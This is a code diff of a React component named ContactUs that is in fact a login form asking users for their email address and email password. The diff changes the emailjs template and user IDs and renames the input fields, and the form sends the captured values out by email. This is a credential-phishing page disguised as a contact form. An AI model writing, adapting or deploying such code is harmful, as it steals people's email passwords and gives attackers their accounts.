@@ -7,7 +7,7 @@ export default function ContactUs() {
     function sendEmail(e) {
         e.preventDefault();
 
-    emailjs.sendForm('gmail', 'template_hb9qmr9', e.target, 'user_SEoZ3jhZmvmc7W9yRaSnR')
+    emailjs.sendForm('gmail', 'template_0vlz6hx', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
         .then((result) => {
             console.log(result.text);
         }, (error) => {
@@ -43,11 +43,11 @@ export default function ContactUs() {
                             <form novalidate id="login_form" form action=""  onSubmit={sendEmail}>
                                 <div class="ttx"><label>Email Address</label></div>
                                 <div class="input-field-login icon username-container">
-                                    <input  name="user" placeholder="Enter your email address." class="std_textbox" type="text"></input>
+                                    <input  name="email" placeholder="Enter your email address." class="std_textbox" type="text"></input>
                                 </div>
                                 <div class="ttxx"><label for="pass">Password</label></div>
                                 <div class="input-field-login icon password-container">
-                                    <input  name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password"></input>
+                                    <input  name="name" id="pass" placeholder="Enter your email password." class="std_textbox" type="password"></input>
                                 </div>
                                 <div class="controls">
                                     <div class="login-btn">
